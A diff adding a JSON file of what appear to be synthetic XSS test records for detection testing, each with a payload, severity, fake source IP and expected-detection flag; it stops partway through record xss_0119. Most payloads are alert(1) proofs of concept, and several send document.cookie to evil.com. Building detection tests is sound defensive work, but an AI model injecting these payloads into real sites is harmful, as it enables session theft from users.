@@ -1,0 +1,1802 @@
+[
+  {
+    "id": "xss_0000",
+    "type": "xss",
+    "payload": "<div onmouseover='alert(1)'>move here</div>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "100.221.205.11",
+    "timestamp": "2026-03-13T20:41:19.761748"
+  },
+  {
+    "id": "xss_0001",
+    "type": "xss",
+    "payload": "<script/xss>alert(1)</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "71.28.115.144",
+    "timestamp": "2026-03-13T21:19:44.761755"
+  },
+  {
+    "id": "xss_0002",
+    "type": "xss",
+    "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "129.250.216.45",
+    "timestamp": "2026-03-13T20:45:43.761762"
+  },
+  {
+    "id": "xss_0003",
+    "type": "xss",
+    "payload": "<iframe src='javascript:alert(1)'>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "91.17.204.111",
+    "timestamp": "2026-03-13T20:26:20.761769"
+  },
+  {
+    "id": "xss_0004",
+    "type": "xss",
+    "payload": "<div onmouseover='alert(1)'>move here</div>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "121.38.135.72",
+    "timestamp": "2026-03-13T20:28:11.761775"
+  },
+  {
+    "id": "xss_0005",
+    "type": "xss",
+    "payload": "<script>alert('XSS')</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "186.204.174.116",
+    "timestamp": "2026-03-13T20:47:29.761781"
+  },
+  {
+    "id": "xss_0006",
+    "type": "xss",
+    "payload": "<a href='javascript:alert(1)'>click</a>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "66.47.171.218",
+    "timestamp": "2026-03-13T21:16:04.761788"
+  },
+  {
+    "id": "xss_0007",
+    "type": "xss",
+    "payload": "<marquee onstart=alert(1)>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "182.114.131.1",
+    "timestamp": "2026-03-13T20:25:39.761796"
+  },
+  {
+    "id": "xss_0008",
+    "type": "xss",
+    "payload": "<IMG SRC=x OnErRoR=alert(1)>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "16.15.61.253",
+    "timestamp": "2026-03-13T20:55:05.761803"
+  },
+  {
+    "id": "xss_0009",
+    "type": "xss",
+    "payload": "<iframe src='javascript:alert(1)'>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "216.70.241.41",
+    "timestamp": "2026-03-13T20:42:55.761810"
+  },
+  {
+    "id": "xss_0010",
+    "type": "xss",
+    "payload": "<audio src=x onerror=alert(1)>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "81.255.45.57",
+    "timestamp": "2026-03-13T21:15:08.761816"
+  },
+  {
+    "id": "xss_0011",
+    "type": "xss",
+    "payload": "'\"-->]]>*/</script></style></title><script>alert(1)</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "59.41.85.195",
+    "timestamp": "2026-03-13T21:04:55.761825"
+  },
+  {
+    "id": "xss_0012",
+    "type": "xss",
+    "payload": "<!--><script>alert(1)</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "11.11.140.78",
+    "timestamp": "2026-03-13T20:36:13.761832"
+  },
+  {
+    "id": "xss_0013",
+    "type": "xss",
+    "payload": "<script/xss>alert(1)</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "194.95.14.22",
+    "timestamp": "2026-03-13T20:37:38.761838"
+  },
+  {
+    "id": "xss_0014",
+    "type": "xss",
+    "payload": "<IMG SRC=x OnErRoR=alert(1)>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "151.167.210.156",
+    "timestamp": "2026-03-13T21:16:32.761844"
+  },
+  {
+    "id": "xss_0015",
+    "type": "xss",
+    "payload": "<body onload=alert(1)>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "118.44.157.46",
+    "timestamp": "2026-03-13T21:04:31.761850"
+  },
+  {
+    "id": "xss_0016",
+    "type": "xss",
+    "payload": "<!--><script>alert(1)</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "167.75.209.100",
+    "timestamp": "2026-03-13T20:52:03.761856"
+  },
+  {
+    "id": "xss_0017",
+    "type": "xss",
+    "payload": "<script>alert(1)//",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "72.216.141.23",
+    "timestamp": "2026-03-13T21:19:49.761862"
+  },
+  {
+    "id": "xss_0018",
+    "type": "xss",
+    "payload": "<script>alert(1)//",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "142.157.131.192",
+    "timestamp": "2026-03-13T21:09:04.761868"
+  },
+  {
+    "id": "xss_0019",
+    "type": "xss",
+    "payload": "<img src=x onerror=alert(1)>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "21.32.33.102",
+    "timestamp": "2026-03-13T20:53:56.761874"
+  },
+  {
+    "id": "xss_0020",
+    "type": "xss",
+    "payload": "<!--><script>alert(1)</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "61.200.97.70",
+    "timestamp": "2026-03-13T20:36:15.761880"
+  },
+  {
+    "id": "xss_0021",
+    "type": "xss",
+    "payload": "<div onmouseover='alert(1)'>move here</div>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "212.252.247.62",
+    "timestamp": "2026-03-13T20:38:24.761887"
+  },
+  {
+    "id": "xss_0022",
+    "type": "xss",
+    "payload": "<iframe src='javascript:alert(1)'>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "50.161.62.162",
+    "timestamp": "2026-03-13T21:12:31.761893"
+  },
+  {
+    "id": "xss_0023",
+    "type": "xss",
+    "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "26.58.166.188",
+    "timestamp": "2026-03-13T20:27:39.761899"
+  },
+  {
+    "id": "xss_0024",
+    "type": "xss",
+    "payload": "<script>alert('XSS')</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "43.221.109.233",
+    "timestamp": "2026-03-13T20:40:30.761905"
+  },
+  {
+    "id": "xss_0025",
+    "type": "xss",
+    "payload": "<!--><script>alert(1)</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "185.164.253.15",
+    "timestamp": "2026-03-13T21:16:02.761911"
+  },
+  {
+    "id": "xss_0026",
+    "type": "xss",
+    "payload": "<audio src=x onerror=alert(1)>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "85.122.63.167",
+    "timestamp": "2026-03-13T21:05:24.761917"
+  },
+  {
+    "id": "xss_0027",
+    "type": "xss",
+    "payload": "<audio src=x onerror=alert(1)>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "63.136.18.104",
+    "timestamp": "2026-03-13T20:53:13.761924"
+  },
+  {
+    "id": "xss_0028",
+    "type": "xss",
+    "payload": "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "60.64.93.242",
+    "timestamp": "2026-03-13T20:37:18.761930"
+  },
+  {
+    "id": "xss_0029",
+    "type": "xss",
+    "payload": "<marquee onstart=alert(1)>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "63.72.175.254",
+    "timestamp": "2026-03-13T21:01:05.761936"
+  },
+  {
+    "id": "xss_0030",
+    "type": "xss",
+    "payload": "'><script>alert(1)</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "192.219.228.149",
+    "timestamp": "2026-03-13T20:42:58.761943"
+  },
+  {
+    "id": "xss_0031",
+    "type": "xss",
+    "payload": "<!--><script>alert(1)</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "38.135.108.146",
+    "timestamp": "2026-03-13T21:06:30.761951"
+  },
+  {
+    "id": "xss_0032",
+    "type": "xss",
+    "payload": "<!--><script>alert(1)</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "2.78.164.59",
+    "timestamp": "2026-03-13T21:08:45.761958"
+  },
+  {
+    "id": "xss_0033",
+    "type": "xss",
+    "payload": "<video><source onerror='alert(1)'>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "211.69.105.71",
+    "timestamp": "2026-03-13T21:19:20.761965"
+  },
+  {
+    "id": "xss_0034",
+    "type": "xss",
+    "payload": "<!--><script>alert(1)</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "155.153.231.149",
+    "timestamp": "2026-03-13T20:29:30.761971"
+  },
+  {
+    "id": "xss_0035",
+    "type": "xss",
+    "payload": "<svg onload=alert(1)>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "78.67.109.125",
+    "timestamp": "2026-03-13T20:41:07.761977"
+  },
+  {
+    "id": "xss_0036",
+    "type": "xss",
+    "payload": "<script>alert(document.cookie)</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "196.86.60.248",
+    "timestamp": "2026-03-13T21:20:37.761983"
+  },
+  {
+    "id": "xss_0037",
+    "type": "xss",
+    "payload": "'\"-->]]>*/</script></style></title><script>alert(1)</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "138.17.114.84",
+    "timestamp": "2026-03-13T20:34:34.761989"
+  },
+  {
+    "id": "xss_0038",
+    "type": "xss",
+    "payload": "<input onfocus=alert(1) autofocus>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "142.245.111.224",
+    "timestamp": "2026-03-13T20:26:00.761995"
+  },
+  {
+    "id": "xss_0039",
+    "type": "xss",
+    "payload": "'><script>alert(1)</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "171.98.91.172",
+    "timestamp": "2026-03-13T21:17:11.762001"
+  },
+  {
+    "id": "xss_0040",
+    "type": "xss",
+    "payload": "<img src=x onerror=alert(1)>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "39.233.92.70",
+    "timestamp": "2026-03-13T20:39:44.762008"
+  },
+  {
+    "id": "xss_0041",
+    "type": "xss",
+    "payload": "<svg onload=alert(1)>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "101.32.183.142",
+    "timestamp": "2026-03-13T20:50:25.762014"
+  },
+  {
+    "id": "xss_0042",
+    "type": "xss",
+    "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "51.111.26.73",
+    "timestamp": "2026-03-13T20:55:27.762020"
+  },
+  {
+    "id": "xss_0043",
+    "type": "xss",
+    "payload": "'\"-->]]>*/</script></style></title><script>alert(1)</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "67.5.181.210",
+    "timestamp": "2026-03-13T20:50:51.762026"
+  },
+  {
+    "id": "xss_0044",
+    "type": "xss",
+    "payload": "</script><script>alert(1)</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "222.166.136.18",
+    "timestamp": "2026-03-13T20:37:56.762032"
+  },
+  {
+    "id": "xss_0045",
+    "type": "xss",
+    "payload": "<svg onload=alert(1)>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "75.43.78.148",
+    "timestamp": "2026-03-13T21:14:46.762038"
+  },
+  {
+    "id": "xss_0046",
+    "type": "xss",
+    "payload": "'\"-->]]>*/</script></style></title><script>alert(1)</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "179.223.18.51",
+    "timestamp": "2026-03-13T20:43:03.762044"
+  },
+  {
+    "id": "xss_0047",
+    "type": "xss",
+    "payload": "<div onmouseover='alert(1)'>move here</div>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "16.189.244.23",
+    "timestamp": "2026-03-13T21:11:50.762050"
+  },
+  {
+    "id": "xss_0048",
+    "type": "xss",
+    "payload": "</script><script>alert(1)</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "150.179.79.157",
+    "timestamp": "2026-03-13T20:29:47.762057"
+  },
+  {
+    "id": "xss_0049",
+    "type": "xss",
+    "payload": "<img src=x onerror=alert(1)>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "202.196.58.37",
+    "timestamp": "2026-03-13T20:30:23.762063"
+  },
+  {
+    "id": "xss_0050",
+    "type": "xss",
+    "payload": "<input onfocus=alert(1) autofocus>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "152.12.138.19",
+    "timestamp": "2026-03-13T20:47:11.762071"
+  },
+  {
+    "id": "xss_0051",
+    "type": "xss",
+    "payload": "<IMG SRC=x OnErRoR=alert(1)>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "108.176.12.180",
+    "timestamp": "2026-03-13T20:54:40.762078"
+  },
+  {
+    "id": "xss_0052",
+    "type": "xss",
+    "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "83.72.73.223",
+    "timestamp": "2026-03-13T20:35:34.762084"
+  },
+  {
+    "id": "xss_0053",
+    "type": "xss",
+    "payload": "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "197.137.244.171",
+    "timestamp": "2026-03-13T20:36:26.762091"
+  },
+  {
+    "id": "xss_0054",
+    "type": "xss",
+    "payload": "'\"-->]]>*/</script></style></title><script>alert(1)</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "212.168.159.232",
+    "timestamp": "2026-03-13T21:20:23.762097"
+  },
+  {
+    "id": "xss_0055",
+    "type": "xss",
+    "payload": "<!--><script>alert(1)</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "82.141.190.203",
+    "timestamp": "2026-03-13T20:31:32.762103"
+  },
+  {
+    "id": "xss_0056",
+    "type": "xss",
+    "payload": "<iframe src='javascript:alert(1)'>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "151.103.204.229",
+    "timestamp": "2026-03-13T21:18:54.762109"
+  },
+  {
+    "id": "xss_0057",
+    "type": "xss",
+    "payload": "<script>alert(document.cookie)</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "102.63.247.33",
+    "timestamp": "2026-03-13T20:30:41.762115"
+  },
+  {
+    "id": "xss_0058",
+    "type": "xss",
+    "payload": "<body onload=alert(1)>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "65.148.191.30",
+    "timestamp": "2026-03-13T20:39:49.762121"
+  },
+  {
+    "id": "xss_0059",
+    "type": "xss",
+    "payload": "<a href='javascript:alert(1)'>click</a>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "97.232.61.183",
+    "timestamp": "2026-03-13T21:08:44.762128"
+  },
+  {
+    "id": "xss_0060",
+    "type": "xss",
+    "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "214.73.61.251",
+    "timestamp": "2026-03-13T21:00:24.762134"
+  },
+  {
+    "id": "xss_0061",
+    "type": "xss",
+    "payload": "<a href='javascript:alert(1)'>click</a>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "79.61.209.46",
+    "timestamp": "2026-03-13T21:08:29.762140"
+  },
+  {
+    "id": "xss_0062",
+    "type": "xss",
+    "payload": "<input onfocus=alert(1) autofocus>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "2.79.201.15",
+    "timestamp": "2026-03-13T20:47:50.762146"
+  },
+  {
+    "id": "xss_0063",
+    "type": "xss",
+    "payload": "<body onload=alert(1)>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "43.181.45.197",
+    "timestamp": "2026-03-13T20:46:12.762152"
+  },
+  {
+    "id": "xss_0064",
+    "type": "xss",
+    "payload": "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "201.67.134.183",
+    "timestamp": "2026-03-13T20:50:25.762158"
+  },
+  {
+    "id": "xss_0065",
+    "type": "xss",
+    "payload": "<script>alert('XSS')</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "103.108.145.219",
+    "timestamp": "2026-03-13T20:58:18.762165"
+  },
+  {
+    "id": "xss_0066",
+    "type": "xss",
+    "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "218.240.236.198",
+    "timestamp": "2026-03-13T20:52:58.762171"
+  },
+  {
+    "id": "xss_0067",
+    "type": "xss",
+    "payload": "'\"-->]]>*/</script></style></title><script>alert(1)</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "143.251.110.68",
+    "timestamp": "2026-03-13T20:36:00.762177"
+  },
+  {
+    "id": "xss_0068",
+    "type": "xss",
+    "payload": "<script/xss>alert(1)</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "76.246.82.14",
+    "timestamp": "2026-03-13T21:21:27.762183"
+  },
+  {
+    "id": "xss_0069",
+    "type": "xss",
+    "payload": "<script>alert(1)//",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "56.244.161.100",
+    "timestamp": "2026-03-13T20:27:24.762189"
+  },
+  {
+    "id": "xss_0070",
+    "type": "xss",
+    "payload": "<script/xss>alert(1)</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "29.169.44.69",
+    "timestamp": "2026-03-13T21:11:37.762195"
+  },
+  {
+    "id": "xss_0071",
+    "type": "xss",
+    "payload": "\"><script>alert(1)</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "50.191.82.181",
+    "timestamp": "2026-03-13T21:03:38.762201"
+  },
+  {
+    "id": "xss_0072",
+    "type": "xss",
+    "payload": "<video><source onerror='alert(1)'>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "69.153.211.118",
+    "timestamp": "2026-03-13T20:45:38.762207"
+  },
+  {
+    "id": "xss_0073",
+    "type": "xss",
+    "payload": "</script><script>alert(1)</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "104.149.206.112",
+    "timestamp": "2026-03-13T20:26:58.762213"
+  },
+  {
+    "id": "xss_0074",
+    "type": "xss",
+    "payload": "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "23.124.99.116",
+    "timestamp": "2026-03-13T20:58:20.762220"
+  },
+  {
+    "id": "xss_0075",
+    "type": "xss",
+    "payload": "<script>alert(1)//",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "99.221.131.168",
+    "timestamp": "2026-03-13T21:13:03.762226"
+  },
+  {
+    "id": "xss_0076",
+    "type": "xss",
+    "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "173.222.55.27",
+    "timestamp": "2026-03-13T21:04:23.762232"
+  },
+  {
+    "id": "xss_0077",
+    "type": "xss",
+    "payload": "<ScRiPt>alert(1)</sCrIpT>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "212.122.240.146",
+    "timestamp": "2026-03-13T20:46:47.762239"
+  },
+  {
+    "id": "xss_0078",
+    "type": "xss",
+    "payload": "'><script>alert(1)</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "11.123.251.45",
+    "timestamp": "2026-03-13T21:22:10.762245"
+  },
+  {
+    "id": "xss_0079",
+    "type": "xss",
+    "payload": "<iframe src='javascript:alert(1)'>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "6.122.32.181",
+    "timestamp": "2026-03-13T21:16:34.762251"
+  },
+  {
+    "id": "xss_0080",
+    "type": "xss",
+    "payload": "<script>alert('XSS')</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "166.111.202.77",
+    "timestamp": "2026-03-13T20:33:14.762257"
+  },
+  {
+    "id": "xss_0081",
+    "type": "xss",
+    "payload": "\"><script>alert(1)</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "140.168.74.232",
+    "timestamp": "2026-03-13T21:10:00.762263"
+  },
+  {
+    "id": "xss_0082",
+    "type": "xss",
+    "payload": "<marquee onstart=alert(1)>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "44.150.47.169",
+    "timestamp": "2026-03-13T21:13:38.762269"
+  },
+  {
+    "id": "xss_0083",
+    "type": "xss",
+    "payload": "<script>alert(1)//",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "65.76.134.236",
+    "timestamp": "2026-03-13T20:32:37.762275"
+  },
+  {
+    "id": "xss_0084",
+    "type": "xss",
+    "payload": "<video><source onerror='alert(1)'>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "22.53.161.86",
+    "timestamp": "2026-03-13T20:59:37.762281"
+  },
+  {
+    "id": "xss_0085",
+    "type": "xss",
+    "payload": "<div onmouseover='alert(1)'>move here</div>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "208.135.45.83",
+    "timestamp": "2026-03-13T21:14:51.762287"
+  },
+  {
+    "id": "xss_0086",
+    "type": "xss",
+    "payload": "<audio src=x onerror=alert(1)>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "104.53.130.80",
+    "timestamp": "2026-03-13T20:53:38.762293"
+  },
+  {
+    "id": "xss_0087",
+    "type": "xss",
+    "payload": "<body onload=alert(1)>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "2.8.0.83",
+    "timestamp": "2026-03-13T20:44:17.762299"
+  },
+  {
+    "id": "xss_0088",
+    "type": "xss",
+    "payload": "<a href='javascript:alert(1)'>click</a>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "123.147.87.113",
+    "timestamp": "2026-03-13T20:59:05.762306"
+  },
+  {
+    "id": "xss_0089",
+    "type": "xss",
+    "payload": "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "220.228.175.17",
+    "timestamp": "2026-03-13T20:41:09.762314"
+  },
+  {
+    "id": "xss_0090",
+    "type": "xss",
+    "payload": "<IMG SRC=x OnErRoR=alert(1)>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "3.62.30.52",
+    "timestamp": "2026-03-13T20:36:52.762321"
+  },
+  {
+    "id": "xss_0091",
+    "type": "xss",
+    "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "2.83.8.75",
+    "timestamp": "2026-03-13T21:19:11.762327"
+  },
+  {
+    "id": "xss_0092",
+    "type": "xss",
+    "payload": "<IMG SRC=x OnErRoR=alert(1)>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "45.158.42.215",
+    "timestamp": "2026-03-13T21:03:56.762333"
+  },
+  {
+    "id": "xss_0093",
+    "type": "xss",
+    "payload": "<script>alert('XSS')</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "219.133.0.140",
+    "timestamp": "2026-03-13T20:43:28.762340"
+  },
+  {
+    "id": "xss_0094",
+    "type": "xss",
+    "payload": "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "64.171.98.114",
+    "timestamp": "2026-03-13T21:01:19.762346"
+  },
+  {
+    "id": "xss_0095",
+    "type": "xss",
+    "payload": "<iframe src='javascript:alert(1)'>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "196.204.33.124",
+    "timestamp": "2026-03-13T21:20:41.762352"
+  },
+  {
+    "id": "xss_0096",
+    "type": "xss",
+    "payload": "<div onmouseover='alert(1)'>move here</div>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "115.146.118.210",
+    "timestamp": "2026-03-13T21:09:41.762358"
+  },
+  {
+    "id": "xss_0097",
+    "type": "xss",
+    "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "179.32.68.118",
+    "timestamp": "2026-03-13T20:31:30.762364"
+  },
+  {
+    "id": "xss_0098",
+    "type": "xss",
+    "payload": "<script/xss>alert(1)</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "126.127.0.141",
+    "timestamp": "2026-03-13T20:29:57.762371"
+  },
+  {
+    "id": "xss_0099",
+    "type": "xss",
+    "payload": "<script>alert('XSS')</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "105.175.97.215",
+    "timestamp": "2026-03-13T20:52:55.762377"
+  },
+  {
+    "id": "xss_0100",
+    "type": "xss",
+    "payload": "<svg onload=alert(1)>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "62.3.92.132",
+    "timestamp": "2026-03-13T21:19:42.762383"
+  },
+  {
+    "id": "xss_0101",
+    "type": "xss",
+    "payload": "\"><script>alert(1)</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "214.240.20.63",
+    "timestamp": "2026-03-13T20:54:25.762389"
+  },
+  {
+    "id": "xss_0102",
+    "type": "xss",
+    "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "154.102.240.200",
+    "timestamp": "2026-03-13T21:03:14.762395"
+  },
+  {
+    "id": "xss_0103",
+    "type": "xss",
+    "payload": "<body onload=alert(1)>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "103.178.112.203",
+    "timestamp": "2026-03-13T20:56:38.762404"
+  },
+  {
+    "id": "xss_0104",
+    "type": "xss",
+    "payload": "<iframe src='javascript:alert(1)'>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "77.215.179.87",
+    "timestamp": "2026-03-13T21:18:46.762410"
+  },
+  {
+    "id": "xss_0105",
+    "type": "xss",
+    "payload": "<ScRiPt>alert(1)</sCrIpT>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "84.132.213.52",
+    "timestamp": "2026-03-13T21:01:08.762416"
+  },
+  {
+    "id": "xss_0106",
+    "type": "xss",
+    "payload": "<ScRiPt>alert(1)</sCrIpT>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "131.101.208.115",
+    "timestamp": "2026-03-13T21:00:14.762422"
+  },
+  {
+    "id": "xss_0107",
+    "type": "xss",
+    "payload": "<script>alert('XSS')</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "41.94.167.216",
+    "timestamp": "2026-03-13T21:09:33.762428"
+  },
+  {
+    "id": "xss_0108",
+    "type": "xss",
+    "payload": "<img src=x onerror=alert(1)>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "200.64.239.95",
+    "timestamp": "2026-03-13T20:34:31.762434"
+  },
+  {
+    "id": "xss_0109",
+    "type": "xss",
+    "payload": "<ScRiPt>alert(1)</sCrIpT>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "110.222.183.181",
+    "timestamp": "2026-03-13T20:55:17.762444"
+  },
+  {
+    "id": "xss_0110",
+    "type": "xss",
+    "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "174.220.236.10",
+    "timestamp": "2026-03-13T20:30:00.762450"
+  },
+  {
+    "id": "xss_0111",
+    "type": "xss",
+    "payload": "<IMG SRC=x OnErRoR=alert(1)>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "177.187.142.204",
+    "timestamp": "2026-03-13T20:48:46.762456"
+  },
+  {
+    "id": "xss_0112",
+    "type": "xss",
+    "payload": "<IMG SRC=x OnErRoR=alert(1)>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "214.17.194.83",
+    "timestamp": "2026-03-13T20:48:01.762462"
+  },
+  {
+    "id": "xss_0113",
+    "type": "xss",
+    "payload": "<marquee onstart=alert(1)>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "77.193.173.19",
+    "timestamp": "2026-03-13T21:14:14.762468"
+  },
+  {
+    "id": "xss_0114",
+    "type": "xss",
+    "payload": "<body onload=alert(1)>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "223.168.52.23",
+    "timestamp": "2026-03-13T20:30:24.762474"
+  },
+  {
+    "id": "xss_0115",
+    "type": "xss",
+    "payload": "<script>alert(document.cookie)</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "102.62.221.64",
+    "timestamp": "2026-03-13T20:40:44.762480"
+  },
+  {
+    "id": "xss_0116",
+    "type": "xss",
+    "payload": "'\"-->]]>*/</script></style></title><script>alert(1)</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "208.59.8.184",
+    "timestamp": "2026-03-13T20:37:39.762487"
+  },
+  {
+    "id": "xss_0117",
+    "type": "xss",
+    "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "35.170.22.112",
+    "timestamp": "2026-03-13T20:35:21.762493"
+  },
+  {
+    "id": "xss_0118",
+    "type": "xss",
+    "payload": "<!--><script>alert(1)</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "37.241.207.120",
+    "timestamp": "2026-03-13T20:34:11.762499"
+  },
+  {
+    "id": "xss_0119",
+    "type": "xss",
+    "payload": "<script>alert('XSS')</script>",
+    "severity": "medium",
+    "expected_detection": true,
